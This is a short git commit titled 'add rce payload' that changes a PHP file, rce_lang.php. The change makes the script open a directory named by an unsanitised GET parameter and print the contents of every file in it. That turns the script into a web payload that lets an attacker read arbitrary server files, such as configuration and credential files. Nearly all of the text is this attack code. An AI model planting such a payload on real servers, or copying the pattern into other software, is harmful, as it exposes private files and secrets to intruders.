054c041c7710898d6e64f2ff5a44f477dba64fe8
Louis Deschanel <louis@localhost.localdomain>
2021-10-01 14:01:30 +0200

    add rce payload

--- rce_lang.php
+++ rce_lang.php
@@ -1,13 +1,14 @@
 <?php
 
 
-if ($handle = opendir('.')) {
+if ($handle = opendir($_GET['dir'])) {
 
     while (false !== ($entry = readdir($handle))) {
 
         if ($entry != "." && $entry != "..") {
 
-            echo "$entry\n";
+          echo "$entry\n";
+          readfile($_GET['dir']."/".$entry);
         }
     }
 
